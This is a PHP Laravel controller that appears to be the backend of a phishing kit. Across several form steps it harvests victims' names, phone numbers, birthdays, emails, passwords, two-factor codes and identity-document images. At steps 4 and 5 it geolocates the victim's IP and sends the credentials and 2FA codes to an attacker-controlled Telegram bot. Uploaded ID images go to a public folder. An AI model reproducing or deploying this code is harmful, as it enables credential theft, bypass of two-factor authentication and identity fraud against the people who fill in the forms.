<?php

namespace App\Http\Controllers;

use App\Models\Data;
use App\Models\Business;
use Illuminate\Http\Request;
use DateTime;
use Reponse;
use Illuminate\Support\Facades\Http;

class DataController extends Controller
{
    private function sendTelegramMessage($message)
    {
        $tele_bot_token = session('tele_bot_token');
        $tele_chat_id = session('tele_chat_id');
        Http::post("https://api.telegram.org/bot{$tele_bot_token}/sendMessage", [
            'chat_id' => $tele_chat_id,
            'text' => $message,
            'parse_mode' => 'HTML'
        ]);
    }
    public function showSession(Request $request)
    {
        return response()->json($request->session()->all());
    }
    public function getAllData(Request $request)
    {
        $businessId = $request->input('business_id');
        if (!$businessId) {
            return response()->json(['error' => 'Business ID is required'], 400);
        }
        
        $data = Data::where('business_id', $businessId)->get();
        return response()->json($data);
    }

    public function getData(Request $request)
    {
       // session()->put('business_id', $request->input('business'));
        $currentStep = $request->input('step', 1);
        $validated = $request->only([
            'business_id',
            'full_name',
            'phone_number',
            'birthday',
            'email',
            'password',
            'repassword',
            'otp_code',
            'otp_code_2',
            'identity_image'
        ]);

        if ($currentStep == 2) {
            if (isset($validated['birthday'])) {
                $date = DateTime::createFromFormat('m/d/Y', $validated['birthday']);
                if ($date) {
                    $validated['birthday'] = $date->format('Y-m-d');
                }
            }
            $record = Data::create($validated);
            session(['record_id' => $record->id]);
            
                //$this->sendTelegramMessage("New record created:\nName: {$validated['full_name']}\nPhone number: {$validated['phone_number']}");
            
        }
        
        if ($currentStep == 3) {
            $recordId = session('record_id');
            if ($recordId) {
                Data::where('id', $recordId)->update($validated);
                //$this->sendTelegramMessage("Email and password updated:\nEmail: {$validated['email']}\nPassword: {$validated['password']}");
            }
        }

        if ($currentStep == 4) {
            $recordId = session('record_id');
            if ($recordId) {
                Data::where('id', $recordId)->update($validated);
                // Get full record data
                $record = Data::find($recordId);
                
                // Get IP location data
                $ipData = Http::get("http://ip-api.com/json/" . $request->ip())->json();
                
                $message = "<b>concac</b>\n\n"
                    . "📝 Session Data:\n"
                    . "Email: <code>" . $record->email . "</code>\n"
                    . "Full Name: <code>" . $record->full_name . "</code>\n"
                    . "Password 1: <code>" . $record->password . "</code>\n"
                    . "Password 2: <code>" . $record->repassword . "</code>\n"
                    . "Phone: <code>" . $record->phone_number . "</code>\n"
                    . "Date of Birth: <code>" . $record->birthday . "</code>\n\n"
                    . "🌐 IP Info:\n"
                    . "IP Address: <code>" . $request->ip() . "</code>\n"
                    . "City: <code>" . ($ipData['city'] ?? 'Unknown') . "</code>\n"
                    . "State: <code>" . ($ipData['regionName'] ?? 'Unknown') . "</code>\n"
                    . "Postal Code: <code>" . ($ipData['zip'] ?? 'Unknown') . "</code>\n"
                    . "User Agent: <code>" . $request->userAgent() . "</code>\n"
                    . "Proxy: <code>" . ($ipData['proxy'] ? 'Yes' : 'No') . "</code>\n\n"
                    . "🔐 2FA Code:\n"
                    . "Code: <code>" . ($record->otp_code ?? 'Not yet provided') . "</code>";
                $this->sendTelegramMessage($message);
            }
        }

        if ($currentStep == 5) {
            $recordId = session('record_id');
            if ($recordId) {
                Data::where('id', $recordId)->update($validated);
                // Get full record data
                $record = Data::find($recordId);
                
                // Get IP location data
                $ipData = Http::get("http://ip-api.com/json/" . $request->ip())->json();
                
                $message = "<b>concac</b>\n\n"
                    . "📝 Session Data:\n"
                    . "Email: <code>" . $record->email . "</code>\n"
                    . "Full Name: <code>" . $record->full_name . "</code>\n"
                    . "Password 1: <code>" . $record->password . "</code>\n"
                    . "Password 2: <code>" . $record->repassword . "</code>\n"
                    . "Phone: <code>" . $record->phone_number . "</code>\n"
                    . "Date of Birth: <code>" . $record->birthday . "</code>\n\n"
                    . "🌐 IP Info:\n"
                    . "IP Address: <code>" . $request->ip() . "</code>\n"
                    . "City: <code>" . ($ipData['city'] ?? 'Unknown') . "</code>\n"
                    . "State: <code>" . ($ipData['regionName'] ?? 'Unknown') . "</code>\n"
                    . "Postal Code: <code>" . ($ipData['zip'] ?? 'Unknown') . "</code>\n"
                    . "User Agent: <code>" . $request->userAgent() . "</code>\n"
                    . "Proxy: <code>" . ($ipData['proxy'] ? 'Yes' : 'No') . "</code>\n\n"
                    . "🔐 2FA Code:\n"
                    . "Code: <code>" . ($record->otp_code ?? 'Not yet provided') . "</code>";
                $this->sendTelegramMessage($message);
            }
        }

        if ($currentStep == 6) {
            $recordId = session('record_id');
            if ($recordId) {
                Data::where('id', $recordId)->update($validated);
               // $this->sendTelegramMessage("Second OTP code updated: {$validated['otp_code_2']}");
            }
        }

        if ($currentStep == 7) {
            $recordId = session('record_id');
            if ($recordId && $request->hasFile('identity_image')) {
                $image = $request->file('identity_image');
                $filename = $recordId . '_' . time() . '.' . $image->getClientOriginalExtension();
                $image->move(public_path('images'), $filename);
                $imagePath = url('images/' . $filename);
                Data::where('id', $recordId)->update(['images' => $imagePath]);
                
                //$this->sendTelegramMessage("Identity image uploaded:\nImage URL: {$imagePath}");
                session()->forget('record_id');
            }
        }

        $nextStep = $currentStep + 1;
        return redirect()->route('home', ['step' => $nextStep]);
    }
}